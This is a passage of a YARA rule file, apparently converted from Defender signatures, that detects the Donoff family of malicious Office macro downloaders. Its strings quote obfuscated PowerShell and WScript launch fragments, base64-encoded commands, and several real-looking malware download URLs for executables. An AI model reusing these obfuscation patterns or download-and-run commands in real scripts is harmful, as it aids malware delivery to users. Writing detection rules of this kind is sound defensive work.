        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 [0-8] 53 68 65 6c 6c 20 68 6a 36 37 67 62 2e 4c 61 62 65 6c 31 2e 43 61 70 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_35
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+'ht\" + \"tps:/\" + \"/tva\" + \"vi.wi\" + \"n/pag\" + \"o.ex\" + \"e'+" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_36
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 77 53 22 20 26 20 43 68 72 28 39 39 29 20 26 20 22 52 49 22 20 26 20 22 70 54 2e 53 68 45 22 20 26 20 22 4c 4c 22 [0-32] 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_37
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://ge.tt/api/1/files/4p6ECJC2/0/blob?download" ascii //weight: 1
        $x_1_2 = "hmmm.EXE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_38
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"cMD\"" ascii //weight: 1
        $x_1_2 = "\"%.E\"" ascii //weight: 1
        $x_1_3 = "\"ttp\"" ascii //weight: 1
        $x_1_4 = "\"://\"" ascii //weight: 1
        $x_1_5 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_39
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"^.e^\" + \"x^e\"" ascii //weight: 1
        $x_1_2 = "I\" + \"nv\" + \"oke-E\"" ascii //weight: 1
        $x_1_3 = "+ \"e   \" + \"/c \"\"\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_40
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"cMgfaskD.gfaskexgfaske gfask/Cgfask" ascii //weight: 1
        $x_1_2 = {20 3d 20 53 68 65 6c 6c 28 [0-8] 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_41
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $n_1_1 = "Sub AutoOpen()" ascii //weight: -1
        $x_1_2 = "sub autoopen()" ascii //weight: 1
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 2e 54 65 78 74 42 6f 78 [0-4] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (not (any of ($n*))) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_42
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "& \".\" & \"j\" & \"s\"" ascii //weight: 1
        $x_1_2 = "Ws--(-cr--(-ip--(-t." ascii //weight: 1
        $x_1_3 = ".Run \"wscript \" & CStr(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_43
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"S^y^S\"" ascii //weight: 1
        $x_1_2 = "\"ttp:/\"" ascii //weight: 1
        $x_1_3 = "\"aPPDA\"" ascii //weight: 1
        $x_1_4 = "\"CMD.E\"" ascii //weight: 1
        $x_1_5 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_44
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "top/\" + \"read" ascii //weight: 1
        $x_1_2 = " + \".eXE" ascii //weight: 1
        $x_1_3 = " = ActiveDocument.DefaultTableStyle = \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_45
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cG93ZXJzaGVsbCAtV2luZG93U3R5bG" ascii //weight: 1
        $x_1_2 = "UgSGlkZGVuICR3c2NyaXB0ID0gbmV3LW9iamVj" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_46
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 42 79 4e 61 6d 65 20 47 65 74 4f 62 6a 65 63 74 28 22 22 2c 20 [0-16] 28 [0-16] 28 22 32 35 36 20 32 36 33 20 32 35 37 20 32 33 38 20 32 35 36 20 32 36 32 20 32 36 33 20 32 33 38 20 32 35 37 20 32}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_47
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run \"wscript \" & " ascii //weight: 1
        $x_1_2 = "ev--!-al" ascii //weight: 1
        $x_1_3 = "Ws--!-cr--!-ip--!-t" ascii //weight: 1
        $x_1_4 = "& \".\" & \"j\" & \"s\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_48
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"power\" & \"sh\" & \"ell\" & \".e\" & \"xe -e\" & \"xec b\" & \"ypas\" & \"s -E\" & \"nc " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_49
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ROOHicroROOOHoft.XROOHLHTTPROOOOHAdodb.ROOOHtrROHaROOHROOOOHROOOHhROHll.Appl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_50
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "sbtiTAbtiRTbti-pbtirObticEbtiSsbti 'bti%AbtiPpbtiDAbtitAbti%.btiexbtie'bti" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_51
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"E4C3C1FF81825A550827393D133228186A252D376F55164A431030\"), \"WPIT4rs1yMRDpJHsT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_52
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {53 69 6d 72 79 70 74 28 22 65 6e 26 37 67 30 36 6c 3e 3c 71 6b 2d 23 24 66 76 3d 6c 71 6a 6e 32 7e 71 65 77 31 3c 7e 7e 67 6a 6e 70 6d 30 7f 24 2b 6c 22 29 20 26 20 53 69 6d 72 79 70 74 28 22 63 7b 31 2f 73 7a 61 7e 76 2f 33 32 6e 22 29}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_53
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2c 20 22 6e 65 70 4f 22 2c 20 02 00 29 2c 20 02 00 2c 20 73 28 04 00 2c 20 22 54 45 47 22 2c 20 04 00 29 2c 20 73 28 04 00 2c 20 22}  //weight: 1, accuracy: Low
        $x_1_2 = {22 64 6e 65 53 22 2c 20 02 00 29 2c 20 02 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_54
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://directexe.com/3s0/ptm_hek.exe" ascii //weight: 1
        $x_1_2 = "CreateObject(\"WScript.Shell\").Run (Replace" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_55
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = "= Form1.Edit2.Text" ascii //weight: 1
        $x_1_3 = {20 54 68 65 6e [0-4] 53 68 65 6c 6c 20}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"CA15r9\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_56
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ed/.-thmpaU8xrmanei/thDheooswmd/tJJd.wcuooe:hahb" ascii //weight: 1
        $x_1_2 = "oxRXyBhCYyg0 =" ascii //weight: 1
        $x_1_3 = ".oxRXyBhCYyg0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_57
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "s(\"oNpT0i ti0l.be /;eti.W 6d WS0wc4EM m 1zTar.l6id;a1lnW5 ;/n0OM.o(6I)so; \", 388, 748)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_58
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"VhYttd2pY:Y/P/AakPPso2cAiAYaYl.PiH2n/Ys2y2s22tvemVA/lV2ovgsV/HAx.VVpvhpHA?Yti2YtlPdeH=\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_59
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"[rkr.!g)ar!v!y[p/frg)nyc!z!r)g/r]t!nz[]v)/z]]bp.a![b]qabyr)a!vya)!b!qbb]s[//!):cg[]g!u\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_60
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"('Us^er-Ag^ent','Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)');\"" ascii //weight: 1
        $x_1_2 = ".e^xe'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_61
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "7gyjgg5r6\", \"" ascii //weight: 1
        $x_1_2 = "= Replace(\"autobluelite." ascii //weight: 1
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-8] 28}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 45 6e 76 69 72 6f 6e 6d 65 6e 74 28 [0-8] 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_62
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Right(\"cochleariuswi\", 2) + Mid(\"disbenchnmgmunderestimation\", 9, 4) + StrReverse(\"\\\\:st\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_63
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 [0-16] 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = "Private Sub InkPicture1_Painted" ascii //weight: 1
        $x_1_3 = {20 3d 20 49 6e 53 74 72 [0-3] 28 [0-16] 2c 20 4d 69 64 28}  //weight: 1, accuracy: Low
        $x_1_4 = "& Mid(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_64
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 50 6f 77 65 72 53 22 [0-16] 3d 20 22 68 65 6c 6c 20 2d 45 78 65 63 20 42 79 70 61 73 73 20 2d 4e 6f 4c 20 2d 57 69 6e 20 48 69 64 64 65 6e 20 2d 45 6e 63 6f 64 65 64 43 6f 6d 6d 61 6e 64 20}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 20 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_65
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "exec = exec + \" -exec bypass -Noninteractive -windowstyle hidden -e \" & str" ascii //weight: 1
        $x_1_2 = "Shell (exec)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_66
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 43 6d [0-8] 64 2e [0-8] 45 78 [0-8] 65 20 [0-8] 2f 43 [0-8] 20 22 22 [0-8] 70 4f [0-8] 57 65 [0-8] 72 53 [0-8] 68 65 [0-8] 4c 6c [0-8] 2e 65 [0-8] 58 45}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 53 68 65 6c 6c 28 [0-16] 2c 20 [0-8] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_67
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"survivors4g.org/w\" + \"p-co\" + \"ntent/plug\" + \"ins/wp-db-backup-made/\"" ascii //weight: 1
        $x_1_2 = "\"ctmayakkabi.com/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_68
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"%\\\" + filename1 + \".e\" + \"x\" + \"E'';}\"" ascii //weight: 1
        $x_1_2 = "= \" \"\"'Pow^er^Sh^ell" ascii //weight: 1
        $x_1_3 = "ht\" + \"tp\" + \":/\" + \"/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_69
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "americium = etercoral + Left(\"\\eelephantopus\", 2) + Ucase(\"xpIr\") + Right(\"dexterityatory.exe\", 9)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_70
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 4f 70 65 6e 20 [0-15] 2c 20 22 68 74 74 70 3a 2f 2f 32 34 37 66 69 6e 61 6e 63 65 64 65 61 6c 2e 63 6f 6d 2f 64 62 75 73 74 2e 65 78 65 22 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 42 79 4e 61 6d 65 28 [0-15] 2c 20 22 73 65 6e 64 22 2c 20 56 62 4d 65 74 68 6f 64 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_71
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://bitcloud.gq/sdk" ascii //weight: 1
        $x_1_2 = "dowNLoaDFilE.iNVoKE" ascii //weight: 1
        $x_1_3 = "{0}{2}{1}{3}{5}{6}{4}" ascii //weight: 1
